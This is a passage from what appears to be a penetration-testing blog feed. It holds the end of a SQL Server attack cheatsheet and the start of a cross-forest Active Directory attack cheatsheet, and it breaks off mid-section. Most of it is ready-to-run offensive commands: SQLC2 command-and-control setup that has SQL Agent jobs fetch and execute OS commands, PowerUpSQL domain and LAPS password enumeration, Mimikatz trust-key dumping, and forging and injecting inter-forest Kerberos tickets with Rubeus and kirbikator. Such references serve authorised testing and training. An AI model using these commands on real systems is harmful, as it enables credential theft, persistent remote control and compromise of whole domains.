&lt;li>
&lt;p>DML triggers:&lt;/p>
&lt;p>Reference:&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/" target="_blank" rel="noopener">https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://docs.microsoft.com/en-us/sql/relational-databases/triggers/create-dml-triggers" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/sql/relational-databases/triggers/create-dml-triggers&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>Logon triggers:&lt;/p>
&lt;p>Reference:&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://docs.microsoft.com/en-us/sql/relational-databases/triggers/logon-triggers" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/sql/relational-databases/triggers/logon-triggers&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="registry">Registry&lt;/h3>
&lt;p>References:&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://support.microsoft.com/en-us/help/887165/bug-you-may-receive-an-access-isdenied-error-message-when-a-query-cal" target="_blank" rel="noopener">https://support.microsoft.com/en-us/help/887165/bug-you-may-receive-an-access-isdenied-error-message-when-a-query-cal&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://blog.netspi.com/get-windows-auto-login-passwords-via-sql-server-powerupsql/" target="_blank" rel="noopener">https://blog.netspi.com/get-windows-auto-login-passwords-via-sql-server-powerupsql/&lt;/a>&lt;/li>
&lt;/ul>
&lt;h3 id="sqlc2">SQLC2&lt;/h3>
&lt;p>This is a csharp assembly; can be imported into SQL Server and used for basic post exploitation.&lt;/p>
&lt;h4 id="sqlc2--installing-server">SQLC2 – Installing Server&lt;/h4>
&lt;p>This functions creates the C2 SQL Server tables in the target database. If the database does not exist, the script will try to create it.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># SQLC2&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Install-SQLC2Server&lt;/span> &lt;span class="n">-Username&lt;/span> &lt;span class="s1">&amp;#39;CloudAdmin&amp;#39;&lt;/span> &lt;span class="n">-Password&lt;/span> &lt;span class="s1">&amp;#39;CloudPassword!&amp;#39;&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s1">&amp;#39;cloudserver1.database.windows.net&amp;#39;&lt;/span> &lt;span class="n">-Database&lt;/span> &lt;span class="s1">&amp;#39;database1&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="sqlc2--installing-psagent">SQLC2 – Installing PsAgent&lt;/h4>
&lt;p>This functions installs a C2 Agent on the target SQL Server by creating a server link to the C2 SQL Server, then it creates a TSQL SQL Agent job that uses the link to download commands from the C2 server and executes them. By default is execute OS command using xp_cmdshell. This requires sysadmin privileges on the target server.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># SQLC2&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Install-SQLC2AgentPs&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s1">&amp;#39;SQLServer1&amp;#39;&lt;/span> &lt;span class="n">-Database&lt;/span> &lt;span class="s1">&amp;#39;test1&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="sqlc2--command--control">SQLC2 – Command &amp;amp; Control&lt;/h4>
&lt;p>View SQLC2 Agents:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># SQLC2&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLC2Agent&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-Username&lt;/span> &lt;span class="s1">&amp;#39;CloudAdmin&amp;#39;&lt;/span> &lt;span class="n">-Password&lt;/span> &lt;span class="s1">&amp;#39;CloudPassword!&amp;#39;&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s1">&amp;#39;cloudserver1.database.windows.net&amp;#39;&lt;/span> &lt;span class="n">-Database&lt;/span> &lt;span class="s1">&amp;#39;database1&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Set command to run on agent:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># SQLC2&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-SQLC2Command&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-Username&lt;/span> &lt;span class="s1">&amp;#39;CloudAdmin&amp;#39;&lt;/span> &lt;span class="n">-Password&lt;/span> &lt;span class="s1">&amp;#39;CloudPassword!&amp;#39;&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s1">&amp;#39;cloudserver1.database.windows.net&amp;#39;&lt;/span> &lt;span class="n">-Database&lt;/span> &lt;span class="s1">&amp;#39;database1&amp;#39;&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s2">&amp;#34;Whoami&amp;#34;&lt;/span> &lt;span class="n">-ServerName&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get command results:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># SQLC2&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-SQLC2Command&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-Username&lt;/span> &lt;span class="s1">&amp;#39;CloudAdmin&amp;#39;&lt;/span> &lt;span class="n">-Password&lt;/span> &lt;span class="s1">&amp;#39;CloudPassword!&amp;#39;&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s1">&amp;#39;cloudserver1.database.windows.net&amp;#39;&lt;/span> &lt;span class="n">-Database&lt;/span> &lt;span class="s1">&amp;#39;database1&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="active-directory-enumeration">Active Directory Enumeration&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Provides the domain account policy for the SQL Server&amp;#39;s domain.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLDomainAccountPolicy&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLDomainAccountPolicy&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1\Instance1&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLDomainAccountPolicy&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1\Instance1&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-LinkUsername&lt;/span> &lt;span class="s2">&amp;#34;domain\user&amp;#34;&lt;/span> &lt;span class="n">-LinkPassword&lt;/span> &lt;span class="s2">&amp;#34;Password123!&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLInstanceLocal&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Get-SQLDomainAccountPolicy&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLInstanceRemote&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Get-SQLDomainAccountPolicy&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Provides a list of the domain computers on the SQL Server&amp;#39;s domain.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLDomainComputer&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Provides a list of the domain controllers on the SQL Server&amp;#39;s domain.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLDomainController&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Provides a list of the potential exploitable computers on the SQL Server&amp;#39;s domain based on Operating System version information.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLDomainExploitableSystem&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Provides a list of the domain groups on the SQL Server&amp;#39;s domain.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLDomainGroup&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Provides a list of the domain group members on the SQL Server&amp;#39;s domain.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLDomainGroupMember&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Can be used to execute arbitrary LDAP queries on the SQL Server&amp;#39;s domain.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLDomainObject&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Provides a list of the organization units on the SQL Server&amp;#39;s domain.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLDomainOu&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Provides a list of the local administrator password on the SQL Server&amp;#39;s domain. This typically required Domain Admin privileges.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLDomainPasswordsLAPS&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Provides a list of sites.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLDomainSite&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Provides a list of subnets.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLDomainSubnet&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Provides a list of domain trusts.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLDomainTrust&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Provides a list of the domain users on the SQL Server&amp;#39;s domain.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLDomainUser&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Provides a list of the disabled domain users on the SQL Server&amp;#39;s domain.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLDomainUser&lt;/span> &lt;span class="n">-UserState&lt;/span> &lt;span class="n">Disabled&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Provides a list of the enabled domain users on the SQL Server&amp;#39;s domain.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLDomainUser&lt;/span> &lt;span class="n">-UserState&lt;/span> &lt;span class="n">Enabled&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Provides a list of the locked domain users on the SQL Server&amp;#39;s domain.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLDomainUser&lt;/span> &lt;span class="n">-UserState&lt;/span> &lt;span class="n">Locked&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Provides a list of the domain users that do not require Kerberos preauthentication on the SQL Server&amp;#39;s domain.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLDomainUser&lt;/span> &lt;span class="n">-UserState&lt;/span> &lt;span class="n">PreAuthNotRequired&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># This parameter can be used to list users that have not change their password in the last 90 days. Any number can be provided though.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLDomainUser&lt;/span> &lt;span class="n">-UserState&lt;/span> &lt;span class="n">PwLastSet&lt;/span> &lt;span class="mf">90&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Provides a list of the domain users that never expire on the SQL Server&amp;#39;s domain.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLDomainUser&lt;/span> &lt;span class="n">-UserState&lt;/span> &lt;span class="n">PwNeverExpires&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Provides a list of the domain users with the PASSWD_NOTREQD flag set on the SQL Server&amp;#39;s domain.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLDomainUser&lt;/span> &lt;span class="n">-UserState&lt;/span> &lt;span class="n">PwNotRequired&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Provides a list of the domain users storing their password using reversible encryption on the SQL Server&amp;#39;s domain.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLDomainUser&lt;/span> &lt;span class="n">-UserState&lt;/span> &lt;span class="n">PwStoredRevEnc&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Provides a list of the domain users that require smart card for interactive login on the SQL Server&amp;#39;s domain.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLDomainUser&lt;/span> &lt;span class="n">-UserState&lt;/span> &lt;span class="n">SmartCardRequired&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Provides a list of the domain users trusted for delegation on the SQL Server&amp;#39;s domain.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLDomainUser&lt;/span> &lt;span class="n">-UserState&lt;/span> &lt;span class="n">TrustedForDelegation&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Provides a list of the domain users trusted to authenticate for delegation on the SQL Server&amp;#39;s domain.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLDomainUser&lt;/span> &lt;span class="n">-UserState&lt;/span> &lt;span class="n">TrustedToAuthForDelegation&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="tools">Tools&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://github.com/netspi/PowerUpSQL" target="_blank" rel="noopener">PowerUpSQL&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/NetSPI/SQLC2" target="_blank" rel="noopener">SQLC2&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/NetSPI/Powershell-Modules" target="_blank" rel="noopener">NetSPI Powershell-Modules&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.heidisql.com/" target="_blank" rel="noopener">HeidiSQL&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/samratashok/nishang" target="_blank" rel="noopener">Nishang&lt;/a>&lt;/li>
&lt;/ul>
&lt;h1 id="references">References&lt;/h1>
&lt;ul>
&lt;li>&lt;a href="https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet" target="_blank" rel="noopener">PowerUpSQL Cheatsheet&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://blog.netspi.com/blindly-discover-sql-server-instances-powerupsql/" target="_blank" rel="noopener">Blindly discover SQL Server instances - PowerUpSQL&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://blog.netspi.com/hacking-sql-server-procedures-part-4-enumerating-domainaccounts/" target="_blank" rel="noopener">Enumerating domain accounts - PowerUpSQL&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-databaserole-members-transact-sql" target="_blank" rel="noopener">SQL database role members&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://docs.microsoft.com/en-us/sql/t-sql/statements/execute-as-transact-sql" target="_blank" rel="noopener">EXECUTE AS&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://blog.netspi.com/hacking-sql-server-stored-procedures-part-2-user-impersonation/" target="_blank" rel="noopener">Hacking SQL Server stored procedures for user impersonation&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://docs.microsoft.com/en-us/sql/relational-databases/security/trustworthy-database-property" target="_blank" rel="noopener">Trustworthy database - 1&lt;/a>&lt;/li>
&lt;li>&lt;a href="http://sqlity.net/en/1653/the-trustworthy-database-property-explained-part-1/" target="_blank" rel="noopener">Trustworthy database - 2&lt;/a>&lt;/li>
&lt;li>&lt;a href="http://www.sqlservercentral.com/articles/Security/121178/" target="_blank" rel="noopener">Trustworthy database - 3&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.slideshare.net/nullbind/beyond-xpcmdshell-owning-the-empire-throughsql-server" target="_blank" rel="noopener">XP_CMDSHELL&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/NetSPI/PowerUpSQL/wiki/Active-Directory-Recon-Functions" target="_blank" rel="noopener">Active Directory Recon functions&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/linked-serversdatabase-engine" target="_blank" rel="noopener">SQL Linked Servers&lt;/a>&lt;/li>
&lt;li>&lt;a href="http://www.labofapenetrationtester.com/2017/03/using-sql-server-for-attacking-forest-trust.html" target="_blank" rel="noopener">Using SQL Server for attacking forest trusts&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://blog.netspi.com/decrypting-mssql-database-link-server-passwords/" target="_blank" rel="noopener">Decrypting database link server passwords&lt;/a>&lt;/li>
&lt;/ul>
&lt;hr></description></item><item><title>Across Forests cheatsheet</title><link>https://www.peco602.com/post/0060-across-forests-cheatsheet/</link><pubDate>Thu, 15 Sep 2022 00:00:00 +0000</pubDate><guid>https://www.peco602.com/post/0060-across-forests-cheatsheet/</guid><description>&lt;h2 id="using-trust-tickets">Using Trust Tickets&lt;/h2>
&lt;p>Trust relationship across forests needs to be established (are not implicit) since a forest is a security boundary. We can only access resources and/or services that have been shared with the domain we have compromised (our source domain). Use e.g BloodHound to look for foreign group memberships between forests.&lt;/p>
&lt;ol>
&lt;li>
&lt;p>Once again, we require the trust key for the inter-forest trust:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;lsadump::trust /patch&amp;#34;&amp;#39;&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;cyberlab-dc.cyberlab.cybercorp.local&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># or&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;lsadump::lsa /patch&amp;#34;&amp;#39;&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;cyberlab-dc.cyberlab.cybercorp.local&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>An inter-forest TGT can be forged:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="s2">&amp;#34;Kerberos::golden /user:Administrator /domain:cyberlab.cybercorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /rc4:cd3fb1b0b49c7a56d285ffdbb1304431 /service:krbtgt /target:evilcorp.local /ticket:C:\AD\Tools\kekeo_old\trust_forest_tkt.kirbi
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Get a TGS for a service (CIFS below) in the target domain by using the forged trust ticket. Tickets for other services (like HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting and WinRM) can be created as well.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># asktgs.exe&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.\&lt;/span>&lt;span class="n">asktgs&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">C:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">AD&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Tools&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">kekeo_old&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">trust_forest_tkt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">kirbi&lt;/span> &lt;span class="n">CIFS&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="nb">evilcorp-dc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">evilcorp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">local&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Use the TGS to access the targeted service.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># kirbikator.exe&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.\&lt;/span>&lt;span class="n">kirbikator&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">lsa&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="n">CIFS&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nb">evilcorp-dc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">evilcorp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">local&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">kirbi&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Now you can access the trusted forest shares:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">ls &lt;/span>&lt;span class="p">\\&lt;/span>&lt;span class="nb">evilcorp-dc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">evilcorp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">local&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">forestshare&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol>
&lt;p>Alternatively, it is possible to use &lt;code>Kekeo&lt;/code> to ask for the TGS:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="p">.\&lt;/span>&lt;span class="n">Rubeus&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">asktgs&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">ticket&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="n">C:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">AD&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Tools&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">kekeo_old&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">trust_forest_tkt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">kirbi&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">service&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="n">CIFS&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="nb">evilcorp-dc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">evilcorp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">local&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">dc&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="nb">evilcorp-dc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">evilcorp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">local&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">ptt&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="search-for-foreign-security-prinicpals">Search for Foreign Security Prinicpals&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>To search for Foreign Security Principals (users who have joined groups in the trusted domain but are part of the first domain) we can use the below PowerView command:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Find-ForeignUser&lt;/span> &lt;span class="n">-Domain&lt;/span> &lt;span class="s2">&amp;#34;evilcorp.local&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
